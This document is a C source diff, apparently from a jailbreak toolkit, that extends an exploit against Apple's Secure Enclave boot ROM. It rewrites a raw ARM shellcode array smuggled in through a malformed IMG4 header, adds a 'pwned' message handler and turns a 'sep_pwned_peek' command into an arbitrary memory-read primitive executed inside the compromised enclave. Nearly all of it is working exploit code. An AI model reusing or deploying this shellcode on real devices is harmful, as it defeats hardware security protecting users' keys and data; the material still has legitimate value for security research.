@@ -87,9 +87,10 @@ static uint64_t gSEPFWLen;
 static volatile struct mailbox_registers32 * mailboxregs32;
 static volatile struct mailbox_registers64 * mailboxregs64;
 static int is_sep64 = 0;
-struct event sep_msg_event, sep_rand_event, sep_boot_event, sep_load_event, sep_panic_event, sep_done_tz0_event, sep_done_integrity_tree_event;
+struct event sep_msg_event, sep_rand_event, sep_boot_event, sep_load_event, sep_panic_event, sep_done_tz0_event, sep_done_integrity_tree_event, sep_pwned_peek_event;
 volatile uint32_t rnd_val;
 volatile uint32_t sep_has_loaded, sep_has_booted, sep_has_panicked, sep_has_done_tz0, seprom_has_left_to_sepos, seprom_has_accepted_art;
+uint32_t sep_pwned_peek_val = 0xdeadbeef;
 
 static const uint8_t img4_data[] = {
     // Outer SEQUENCE: IMG4
@@ -125,17 +126,20 @@ static const size_t img4_size = sizeof(img4_data);
 // 0x30, 0x83, 0x10, 0x40, for IMG4 header, with length > 0x100000 bytes
 // andsmi r8, r0, r0, lsr r3
 unsigned char sep_send_ab_bin[] = {
-    0x30, 0x83, 0x10, 0x40,
-    0x4f, 0xf0, 0x7f, 0xf5, 0x00, 0x00, 0xa0, 0xe3,
+    0x30, 0x83, 0x10, 0x40, 0x4f, 0xf0, 0x7f, 0xf5, 0x00, 0x00, 0xa0, 0xe3,
     0x17, 0x0f, 0x08, 0xee, 0x4f, 0xf0, 0x7f, 0xf5, 0x6f, 0xf0, 0x7f, 0xf5,
     0x10, 0x0f, 0x11, 0xee, 0x01, 0x00, 0x80, 0xe3, 0x10, 0x0f, 0x01, 0xee,
-    0x6f, 0xf0, 0x7f, 0xf5, 0x00, 0x00, 0x00, 0xeb, 0xfe, 0xff, 0xff, 0xea,
-    0xa0, 0x2b, 0x00, 0xe3, 0xa0, 0x2d, 0x43, 0xe3, 0x00, 0x30, 0x92, 0xe5,
-    0x01, 0x08, 0x13, 0xe3, 0x01, 0x00, 0x00, 0x0a, 0x02, 0xf0, 0x20, 0xe3,
-    0xfa, 0xff, 0xff, 0xea, 0xff, 0x00, 0x00, 0xe3, 0xab, 0x00, 0x40, 0xe3,
-    0x00, 0x10, 0xa0, 0xe3, 0x10, 0x00, 0x82, 0xe5, 0x14, 0x10, 0x82, 0xe5,
-    0x1e, 0xff, 0x2f, 0xe1};
-unsigned int sep_send_ab_bin_len = 100;
+    0x6f, 0xf0, 0x7f, 0xf5, 0x00, 0x00, 0xa0, 0xe3, 0xff, 0x10, 0x00, 0xe3,
+    0xab, 0x10, 0x40, 0xe3, 0x08, 0x00, 0x00, 0xeb, 0x0f, 0x00, 0x00, 0xeb,
+    0x50, 0x28, 0xe7, 0xe7, 0xc0, 0x00, 0x52, 0xe3, 0xfb, 0xff, 0xff, 0x1a,
+    0x00, 0x00, 0x91, 0xe5, 0xff, 0x10, 0x00, 0xe3, 0xac, 0x10, 0x40, 0xe3,
+    0x00, 0x00, 0x00, 0xeb, 0xf6, 0xff, 0xff, 0xea, 0xa0, 0x2b, 0x00, 0xe3,
+    0xa0, 0x2d, 0x43, 0xe3, 0x00, 0x30, 0x92, 0xe5, 0x01, 0x08, 0x13, 0xe3,
+    0xfc, 0xff, 0xff, 0x1a, 0x10, 0x10, 0x82, 0xe5, 0x14, 0x00, 0x82, 0xe5,
+    0x1e, 0xff, 0x2f, 0xe1, 0x80, 0x2b, 0x00, 0xe3, 0xa0, 0x2d, 0x43, 0xe3,
+    0x08, 0x00, 0x92, 0xe5, 0x02, 0x08, 0x10, 0xe3, 0xfc, 0xff, 0xff, 0x1a,
+    0x18, 0x00, 0x92, 0xe5, 0x1c, 0x10, 0x92, 0xe5, 0x1e, 0xff, 0x2f, 0xe1};
+unsigned int sep_send_ab_bin_len = 156;
 
 void (*sepfw_kpf_hook)(void* sepfw_bytes, size_t sepfw_size);
 void sepfw_kpf(void* sepfw_bytes, size_t sepfw_size) {
@@ -236,7 +240,9 @@ void seprom_execute_opcode(uint8_t operation, uint8_t param, uint32_t data) {
     sep_send_msg(255, 0x0, operation, param, data);
 }
 
-void sep_handle_msg_from_seprom(union sep_message_u msg) {
+bool sep_is_pwned;
+void sep_handle_msg_from_seprom(union sep_message_u msg)
+{
     if (msg.msg.opcode == 255) {
         fiprintf(stderr, "SEPROM panic!\n");
         sep_has_panicked = true;
@@ -261,6 +267,13 @@ void sep_handle_msg_from_seprom(union sep_message_u msg) {
     else if (msg.msg.opcode == 0xab)
     {
         iprintf("sep pwned with opcode %x\n", msg.msg.opcode);
+        iprintf("with data %x\n", msg.msg.data);
+        sep_is_pwned = 1;
+    }
+    else if (msg.msg.opcode == 0xac)
+    {
+        sep_pwned_peek_val = msg.msg.data;
+        event_fire(&sep_pwned_peek_event);
     }
     else
     {
@@ -502,7 +515,6 @@ asm(".text\n"
 uint32_t volatile* remote_addr;
 uint32_t volatile* remote_data;
 uint32_t volatile* remote_sts;
-bool sep_is_pwned;
 uint32_t sep_blackbird_read(uint32_t addr) {
     *remote_addr = addr;
     *remote_sts = 1;
@@ -1046,6 +1058,7 @@ struct sep_command {
 
 void sep_help(const char* cmd, char* args);
 #define SEP_COMMAND(_name, _desc, _cb) {.name = _name, .desc = _desc, .cb = _cb}
+#define SEP_PWNED_PEEK_OPCODE 0xC0
 void sep_pwned_peek(const char* cmd, char* args) {
     if(!sep_is_pwned) {
         iprintf("sep is not pwned!\n");
@@ -1058,8 +1071,10 @@ void sep_pwned_peek(const char* cmd, char* args) {
     }
 
     uint32_t addr = strtoul(args, NULL, 16);
-    uint32_t rv = sep_blackbird_read((uint32_t)addr);
-    iprintf("0x%x: %x (%x %x %x %x)\n", (uint32_t)addr, rv, rv&0xff, (rv>>8)&0xff, (rv>>16)&0xff, (rv>>24)&0xff);
+    disable_interrupts();
+    seprom_execute_opcode(SEP_PWNED_PEEK_OPCODE, 0, addr);
+    event_wait_asserted(&sep_pwned_peek_event);
+    iprintf("0x%x: %x (%x %x %x %x)\n", (uint32_t)addr, sep_pwned_peek_val, sep_pwned_peek_val&0xff, (sep_pwned_peek_val>>8)&0xff, (sep_pwned_peek_val>>16)&0xff, (sep_pwned_peek_val>>24)&0xff);
 }
 void sep_pwned_poke(const char* cmd, char* args) {
     if(!sep_is_pwned) {
@@ -1423,7 +1438,7 @@ void sep_shc(const char *cmd, char *args)
     __asm__ volatile("dmb sy\n"
                      "isb\n" ::
                          : "memory");
-    for (int i = 0; i < 64 * (sep_send_ab_bin_len + 31) / 32 / 8; i++)
+    for (int i = 0; i < 64 * ((sep_send_ab_bin_len + 31) / 32) / 8; i++)
     {
         iprintf("0x%llx\n", *(volatile uint64_t *)(tz0_base + i * 8));
     }
